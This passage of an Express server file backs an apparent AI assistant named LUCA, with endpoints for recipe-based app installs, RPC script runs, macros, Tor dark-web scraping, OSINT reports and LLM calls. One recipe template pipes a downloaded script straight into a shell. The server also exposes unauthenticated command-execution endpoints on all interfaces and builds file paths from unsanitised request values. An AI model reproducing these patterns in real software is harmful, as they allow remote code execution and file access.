        return res.status(404).json({ error: 'Subsystem not found' });
    }
    
    res.json({
        id: subsystem.id,
        name: subsystem.name,
        pid: subsystem.pid,
        port: subsystem.port,
        status: subsystem.status,
        startTime: subsystem.startTime,
        uptime: Date.now() - subsystem.startTime,
        cpu: subsystem.cpu,
        mem: subsystem.mem,
        logCount: subsystem.logs.length
    });
});

// --- NEURAL FORGE API ENDPOINTS (CONCEPT 1) ---

// POST /api/forge/install - Install from JSON recipe
app.post('/api/forge/install', async (req, res) => {
    try {
        const { appName, recipe } = req.body;
        
        if (!appName || !recipe) {
            return res.status(400).json({ error: 'Missing appName or recipe' });
        }
        
        // Validate recipe structure
        if (!recipe.install || !Array.isArray(recipe.install)) {
            return res.status(400).json({ error: 'Invalid recipe: missing install array' });
        }
        
        console.log(`[FORGE] Installing: ${appName}`);
        
        // Execute recipe (async, but we'll wait for completion)
        try {
            const result = await executeForgeRecipe(recipe, appName);
            res.json({ 
                success: true, 
                appName,
                appPath: result.appPath,
                logs: result.logs,
                message: `Installation completed: ${appName}`
            });
        } catch (error) {
            res.status(500).json({ 
                error: `Installation failed: ${error.message}`,
                logs: error.logs || []
            });
        }
        
    } catch (e) {
        console.error("Forge Install Error", e);
        res.status(500).json({ error: e.message });
    }
});

// GET /api/forge/list - List installed forge apps
app.get('/api/forge/list', (req, res) => {
    try {
        const apps = [];
        if (fs.existsSync(FORGE_DIR)) {
            const items = fs.readdirSync(FORGE_DIR);
            for (const item of items) {
                const itemPath = path.join(FORGE_DIR, item);
                if (fs.statSync(itemPath).isDirectory()) {
                    // Check for recipe.json
                    const recipePath = path.join(itemPath, 'recipe.json');
                    let recipe = null;
                    if (fs.existsSync(recipePath)) {
                        try {
                            recipe = JSON.parse(fs.readFileSync(recipePath, 'utf8'));
                        } catch (e) {}
                    }
                    
                    apps.push({
                        name: item,
                        path: itemPath,
                        recipe,
                        installed: fs.existsSync(itemPath)
                    });
                }
            }
        }
        res.json(apps);
    } catch (e) {
        console.error("Forge List Error", e);
        res.status(500).json({ error: e.message });
    }
});

// GET /api/forge/recipes - Get available recipe templates
app.get('/api/forge/recipes', (req, res) => {
    // Return example recipes that LUCA can use
    const templates = {
        'stable-diffusion': {
            name: 'Stable Diffusion WebUI',
            description: 'Install Stable Diffusion with Gradio web interface',
            install: [
                { method: 'git.clone', params: { url: 'https://github.com/AUTOMATIC1111/stable-diffusion-webui.git' } },
                { method: 'shell.run', params: { message: 'pip install -r requirements.txt', venv: 'venv', path: 'stable-diffusion-webui' } }
            ]
        },
        'local-llama': {
            name: 'Local LLaMA Server',
            description: 'Install Ollama or similar local LLM server',
            install: [
                { method: 'shell.run', params: { message: 'curl -fsSL https://ollama.com/install.sh | sh' } }
            ]
        },
        'python-webapp': {
            name: 'Python Web Application',
            description: 'Template for Flask/FastAPI app with venv',
            install: [
                { method: 'fs.mkdir', params: { path: 'app' } },
                { method: 'shell.run', params: { message: 'python3 -m venv venv', path: 'app' } },
                { method: 'shell.run', params: { message: 'pip install flask', venv: 'venv', path: 'app' } }
            ]
        }
    };
    
    res.json(templates);
});

// --- STRUCTURED RPC PROTOCOL API ENDPOINTS (CONCEPT 4) ---

// POST /api/rpc/execute - Execute an RPC script
app.post('/api/rpc/execute', async (req, res) => {
    try {
        const { script } = req.body;
        
        if (!script || !script.run || !Array.isArray(script.run)) {
            return res.status(400).json({ error: 'Invalid RPC script: missing run array' });
        }
        
        console.log(`[RPC] Executing script with ${script.run.length} steps`);
        
        try {
            const result = await executeRpcScript(script);
            res.json({
                success: true,
                results: result.results,
                context: result.context
            });
        } catch (error) {
            res.status(500).json({
                error: error.message,
                results: error.results || []
            });
        }
    } catch (e) {
        console.error("RPC Execute Error", e);
        res.status(500).json({ error: e.message });
    }
});

// POST /api/rpc/macro/save - Save an RPC script as a macro
app.post('/api/rpc/macro/save', (req, res) => {
    try {
        const { name, description, script } = req.body;
        
        if (!name || !script) {
            return res.status(400).json({ error: 'Missing name or script' });
        }
        
        if (!script.run || !Array.isArray(script.run)) {
            return res.status(400).json({ error: 'Invalid script: missing run array' });
        }
        
        const macro = {
            name,
            description: description || '',
            script,
            created: Date.now(),
            version: '1.0'
        };
        
        const macroFile = path.join(MACROS_DIR, `${name}.json`);
        fs.writeFileSync(macroFile, JSON.stringify(macro, null, 2), 'utf8');
        
        res.json({ success: true, name, path: macroFile });
    } catch (e) {
        console.error("RPC Macro Save Error", e);
        res.status(500).json({ error: e.message });
    }
});

// GET /api/rpc/macro/list - List all saved macros
app.get('/api/rpc/macro/list', (req, res) => {
    try {
        const macros = [];
        if (fs.existsSync(MACROS_DIR)) {
            const files = fs.readdirSync(MACROS_DIR);
            for (const file of files) {
                if (file.endsWith('.json')) {
                    try {
                        const content = fs.readFileSync(path.join(MACROS_DIR, file), 'utf8');
                        const macro = JSON.parse(content);
                        macros.push({
                            name: macro.name,
                            description: macro.description,
                            created: macro.created,
                            stepCount: macro.script?.run?.length || 0
                        });
                    } catch (e) {
                        console.error(`Failed to parse macro file ${file}:`, e);
                    }
                }
            }
        }
        res.json(macros);
    } catch (e) {
        console.error("RPC Macro List Error", e);
        res.status(500).json({ error: e.message });
    }
});

// GET /api/rpc/macro/:name - Get a specific macro
app.get('/api/rpc/macro/:name', (req, res) => {
    try {
        const { name } = req.params;
        const macroFile = path.join(MACROS_DIR, `${name}.json`);
        
        if (!fs.existsSync(macroFile)) {
            return res.status(404).json({ error: 'Macro not found' });
        }
        
        const content = fs.readFileSync(macroFile, 'utf8');
        const macro = JSON.parse(content);
        res.json(macro);
    } catch (e) {
        console.error("RPC Macro Get Error", e);
        res.status(500).json({ error: e.message });
    }
});

// DELETE /api/rpc/macro/:name - Delete a macro
app.delete('/api/rpc/macro/:name', (req, res) => {
    try {
        const { name } = req.params;
        const macroFile = path.join(MACROS_DIR, `${name}.json`);
        
        if (!fs.existsSync(macroFile)) {
            return res.status(404).json({ error: 'Macro not found' });
        }
        
        fs.unlinkSync(macroFile);
        res.json({ success: true, message: `Macro "${name}" deleted` });
    } catch (e) {
        console.error("RPC Macro Delete Error", e);
        res.status(500).json({ error: e.message });
    }
});

// GET /api/osint/tor/status - Check Tor connection status
app.get('/api/osint/tor/status', async (req, res) => {
    try {
        const status = await checkTorConnection();
        res.json(status);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// POST /api/osint/darkweb/scrape - Scrape a specific dark web page
app.post('/api/osint/darkweb/scrape', async (req, res) => {
    try {
        const { url } = req.body;
        if (!url) {
            return res.status(400).json({ error: 'Missing url parameter' });
        }

        const torStatus = await checkTorConnection();
        if (!torStatus.available) {
            return res.status(503).json({ 
                error: 'Tor is not available. Please ensure Tor is running on 127.0.0.1:9050'
            });
        }

        const result = await scrapeDarkWebPage(url);
        res.json(result);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// GET /api/osint/investigations/list - List all investigation reports
app.get('/api/osint/investigations/list', (req, res) => {
    try {
        const reportDir = path.join(currentWorkingDirectory, 'investigations');
        const reports = [];
        
        if (fs.existsSync(reportDir)) {
            const files = fs.readdirSync(reportDir);
            for (const file of files) {
                if (file.endsWith('.json')) {
                    try {
                        const content = fs.readFileSync(path.join(reportDir, file), 'utf8');
                        const report = JSON.parse(content);
                        reports.push({
                            file,
                            target: report.target,
                            timestamp: report.timestamp,
                            riskScore: report.riskScore,
                            resultCount: report.hits?.length || 0,
                            summary: report.summary,
                            enginesUsed: report.enginesUsed,
                            severity: report.meta?.SEVERITY
                        });
                    } catch (e) {
                        console.error(`Failed to parse report ${file}:`, e);
                    }
                }
            }
        }
        
        res.json(reports.sort((a, b) => b.timestamp - a.timestamp));
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// GET /api/osint/investigations/:filename - Get specific report details
app.get('/api/osint/investigations/:filename', (req, res) => {
    try {
        const { filename } = req.params;
        const reportFile = path.join(currentWorkingDirectory, 'investigations', filename);
        
        if (!fs.existsSync(reportFile)) {
            return res.status(404).json({ error: 'Report not found' });
        }
        
        const content = fs.readFileSync(reportFile, 'utf8');
        const report = JSON.parse(content);
        res.json(report);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// --- MULTI-MODEL LLM API ENDPOINTS (PHASE 2) ---

// GET /api/llm/providers - List available LLM providers
app.get('/api/llm/providers', (req, res) => {
    try {
        // For now, return hardcoded list. In future, query llmService
        const providers = [
            {
                name: 'gemini',
                model: 'gemini-pro',
                available: true,
                supportsFunctions: true,
                supportsStreaming: true,
                costPerToken: { input: 0.5, output: 1.5 }
            },
            {
                name: 'openai',
                model: 'gpt-4o',
                available: !!process.env.OPENAI_API_KEY,
                supportsFunctions: true,
                supportsStreaming: true,
                costPerToken: { input: 2.5, output: 10.0 },
                note: 'Set OPENAI_API_KEY to enable'
            },
            {
                name: 'claude',
                model: 'claude-3-5-sonnet-20241022',
                available: !!process.env.ANTHROPIC_API_KEY,
                supportsFunctions: true,
                supportsStreaming: true,
                costPerToken: { input: 3.0, output: 15.0 },
                note: 'Set ANTHROPIC_API_KEY to enable'
            },
            {
                name: 'ollama',
                model: 'llama3.1',
                available: true, // Always available if Ollama is running
                supportsFunctions: false,
                supportsStreaming: true,
                costPerToken: { input: 0, output: 0 },
                note: 'Local model - set OLLAMA_BASE_URL (default: http://127.0.0.1:11434)'
            }
        ];
        
        res.json(providers);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// POST /api/llm/generate - Generate text using specified LLM provider
app.post('/api/llm/generate', async (req, res) => {
    try {
        const { provider = 'gemini', prompt, options } = req.body;
        
        if (!prompt) {
            return res.status(400).json({ error: 'Missing prompt parameter' });
        }

        // For now, use Gemini. In future, use llmService
        const apiKey = process.env.API_KEY || process.env.GEMINI_API_KEY;
        if (!apiKey) {
            return res.status(500).json({ error: 'LLM API key not configured' });
        }

        if (provider !== 'gemini') {
            return res.status(501).json({ 
                error: `Provider "${provider}" not yet implemented. Currently only "gemini" is supported.`,
                hint: 'Set OPENAI_API_KEY, ANTHROPIC_API_KEY, or OLLAMA_BASE_URL to enable other providers'
            });
        }

        // Use Gemini API
        const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=${apiKey}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                contents: [{
                    parts: [{ text: prompt }]
                }],
                generationConfig: {
                    temperature: options?.temperature ?? 0.7,
                    maxOutputTokens: options?.maxTokens ?? 8192
                }
            })
        });

        if (!response.ok) {
            throw new Error(`Gemini API error: ${response.status}`);
        }

        const data = await response.json();
        const text = data.candidates?.[0]?.content?.parts?.[0]?.text || '';
        
        res.json({ text, provider: 'gemini' });
    } catch (e) {
        console.error("LLM Generate Error", e);
        res.status(500).json({ error: e.message });
    }
});

// POST /api/llm/set-default - Set default LLM provider
app.post('/api/llm/set-default', (req, res) => {
    try {
        const { provider } = req.body;
        
        if (!provider) {
            return res.status(400).json({ error: 'Missing provider parameter' });
        }

        // For now, just validate. In future, use llmService.setDefaultProvider()
        const validProviders = ['gemini', 'openai', 'claude', 'ollama'];
        if (!validProviders.includes(provider)) {
            return res.status(400).json({ error: `Invalid provider. Must be one of: ${validProviders.join(', ')}` });
        }

        // TODO: Persist to config file or database
        res.json({ success: true, provider, message: `Default provider set to ${provider} (not yet fully implemented)` });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// POST /api/osint/investigations/summarize - Generate LLM summary for a report
app.post('/api/osint/investigations/summarize', async (req, res) => {
    try {
        const { filename } = req.body;
        const reportFile = path.join(currentWorkingDirectory, 'investigations', filename);
        
        if (!fs.existsSync(reportFile)) {
            return res.status(404).json({ error: 'Report not found' });
        }
        
        const content = fs.readFileSync(reportFile, 'utf8');
        const report = JSON.parse(content);
        
        // Generate summary using Gemini
        const summaryPrompt = `You are an OSINT analyst. Generate a concise executive summary (2-3 paragraphs) for this dark web investigation report.

Target: ${report.target}
Risk Score: ${report.riskScore}/100
Results Found: ${report.hits?.length || 0}
Engines Used: ${report.enginesUsed?.join(', ') || 'N/A'}

Findings:
${report.hits?.slice(0, 10).map((h: any, i: number) => `${i + 1}. ${h.title || 'Untitled'} - ${h.url}`).join('\n') || 'No findings'}

Provide a professional summary that:
1. Explains what was searched and why
2. Highlights key findings and their significance
3. Assesses the risk level and implications
4. Mentions any notable patterns or concerns

Summary:`;

        // Call Gemini API for summary generation
        // Note: This requires the Gemini API key to be available
        // For now, we'll generate a basic summary
        // In production, integrate with geminiService
        
        const basicSummary = `Investigation Summary for "${report.target}"

This investigation searched the dark web for "${report.target}" across ${report.enginesUsed?.length || 0} search engines (${report.enginesUsed?.join(', ') || 'N/A'}). 

The search returned ${report.hits?.length || 0} results with a risk score of ${report.riskScore}/100, indicating a ${report.meta?.SEVERITY || 'UNKNOWN'} severity level.

${report.hits && report.hits.length > 0 ? `Key findings include ${report.hits.length} potential matches across various dark web platforms. The presence of these results suggests ${report.riskScore >= 70 ? 'significant exposure' : report.riskScore >= 40 ? 'moderate exposure' : 'limited exposure'} of the target information on dark web platforms.` : 'No significant findings were discovered in this investigation.'}

${report.riskScore >= 70 ? '⚠️ HIGH RISK: Immediate action recommended to secure exposed information.' : report.riskScore >= 40 ? '⚠️ MODERATE RISK: Review findings and consider security measures.' : '✅ LOW RISK: Limited exposure detected, but continued monitoring recommended.'}`;

        // Save summary back to report
        report.summary = basicSummary;
        fs.writeFileSync(reportFile, JSON.stringify(report, null, 2), 'utf8');
        
        res.json({ summary: basicSummary });
    } catch (e) {
        console.error("Summary Generation Error", e);
        res.status(500).json({ error: e.message });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`
    -----------------------------------------
    >>> LUCA NEURAL CORE LISTENING: ${PORT} <<<
    -----------------------------------------
    `);
});
